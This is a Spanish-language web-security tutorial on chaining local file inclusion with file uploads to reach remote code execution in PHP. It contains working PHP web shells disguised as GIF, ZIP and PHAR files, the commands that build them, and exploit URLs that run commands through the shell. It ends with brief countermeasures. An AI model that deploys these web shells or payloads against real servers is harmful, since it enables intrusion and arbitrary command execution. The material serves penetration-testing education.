---
title: LFI y Subida de Archivos
date: 2025-06-07 11:00:00 +0000
categories: [Web Security, Pentesting]
tags: [LFI, file-upload, php, web-shells, penetration-testing]
image: 
    path: /assets/img/posts/lfi-file-upload/lfi-banner.png 
    alt:  cabecera
description: >
  Explotando Vulnerabilidades de Inclusión Local
pin: false  
toc: true   
math: false 
mermaid: false 
---

La **inclusión local de archivos (LFI)** combinada con funcionalidades de subida de archivos representa una de las técnicas más efectivas para lograr **ejecución remota de código (RCE)** en aplicaciones web. En este post exploraremos diferentes métodos para explotar estas vulnerabilidades.

---

## Introducción a LFI y Subida de Archivos

Las funcionalidades de subida de archivos son omnipresentes en las aplicaciones web modernas, ya que los usuarios normalmente necesitan configurar sus perfiles y el uso de la aplicación web subiendo sus datos. Para los atacantes, la capacidad de almacenar archivos en el servidor back-end puede extender la explotación de muchas vulnerabilidades, como las vulnerabilidades de inclusión de archivos.

---

### Funciones Vulnerables por Lenguaje

Para que este ataque funcione, la función vulnerable debe tener capacidades de **ejecución de código**. Las siguientes funciones permiten ejecutar código con inclusión de archivos:

| Lenguaje | Función | Leer Contenido | Ejecutar | URL Remota |
|----------|---------|----------------|----------|------------|
| **PHP** | `include()/include_once()` | ✅ | ✅ | ✅ |
| **PHP** | `require()/require_once()` | ✅ | ✅ | ❌ |
| **NodeJS** | `res.render()` | ✅ | ✅ | ❌ |
| **Java** | `import` | ✅ | ✅ | ✅ |
| **.NET** | `include` | ✅ | ✅ | ✅ |

---

## Método 1: Subida de Imagen Maliciosa

### Creando la Imagen Maliciosa

El primer paso es crear una imagen maliciosa que contenga código PHP web shell pero que aún parezca y funcione como una imagen normal.

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

> **Nota:** Utilizamos una imagen GIF porque sus magic bytes son fácilmente tipeables (caracteres ASCII), mientras que otras extensiones tienen magic bytes en binario que necesitarían ser URL encoded.
{: .prompt-notice}

### Subiendo el Archivo

Una vez creado nuestro archivo malicioso, necesitamos subirlo a la aplicación web. Típicamente esto se hace a través de formularios de perfil o configuración.

### Obteniendo la Ruta del Archivo

Después de subir nuestro archivo, necesitamos conocer la ruta donde se almacenó. En la mayoría de casos, especialmente con imágenes, podemos obtener acceso a nuestro archivo y conseguir su ruta desde su URL.

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

### Explotación

Con la ruta del archivo en mano, solo necesitamos incluir el archivo subido en la función vulnerable LFI:

```
http://target.com/vulnerable.php?file=./profile_images/shell.gif&cmd=id
```

---

## Método 2: Wrapper ZIP

### Creando el Archivo ZIP

Esta técnica utiliza los wrappers de PHP para ejecutar código PHP. Aunque este wrapper no está habilitado por defecto, puede funcionar en ciertos casos específicos.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
```

### Explotación con Wrapper ZIP

Una vez subido el archivo shell.jpg, podemos incluirlo usando el wrapper `zip://` y referenciar archivos dentro de él con `#`:

```
http://target.com/vulnerable.php?file=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

---

## Método 3: Wrapper PHAR

### Creando el Archivo PHAR

El wrapper `phar://` ofrece otra alternativa para lograr ejecución de código. Primero creamos un script PHP:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

### Compilación y Preparación

```bash
php --define phar.readonly=0 shell.php
mv shell.phar shell.jpg
```


### Explotación con PHAR

```
http://target.com/vulnerable.php?file=phar://./profile_images/shell.jpg/shell.txt&cmd=id
```

---

## Contramedidas y Prevención

### Validación Estricta
- Validar tanto la extensión como el contenido del archivo
- Implementar lista blanca de tipos MIME permitidos
- Verificar magic bytes de archivos

### Aislamiento de Archivos
- Almacenar archivos subidos fuera del directorio web
- Usar directorios con permisos restrictivos
- Implementar naming schemes aleatorios

### Sanitización de Entradas
- Validar y sanitizar todas las entradas del usuario
- Usar rutas absolutas en lugar de relativas
- Implementar controles de acceso adecuados

---

## Conclusiones

La combinación de vulnerabilidades LFI con funcionalidades de subida de archivos puede resultar en **ejecución remota de código**, incluso cuando la funcionalidad de subida no es vulnerable por sí misma. El **primer método** (imagen maliciosa) es el más confiable y debería funcionar en la mayoría de casos con la mayoría de frameworks web.

Los métodos de **ZIP** y **PHAR** deben considerarse como alternativas cuando el primer método no funciona, ya que requieren configuraciones específicas de PHP.

> **Importante:** Existe otro ataque LFI/uploads obsoleto que puede ocurrir si la subida de archivos está habilitada en las configuraciones de PHP y la página phpinfo() está expuesta. Sin embargo, este ataque no es muy común ya que tiene requisitos muy específicos (LFI + uploads habilitados + PHP antiguo + phpinfo() expuesto).
{: .prompt-warning}

---

### Referencias

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PHP Wrappers Documentation](https://www.php.net/manual/en/wrappers.php)
- [Local File Inclusion Techniques](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)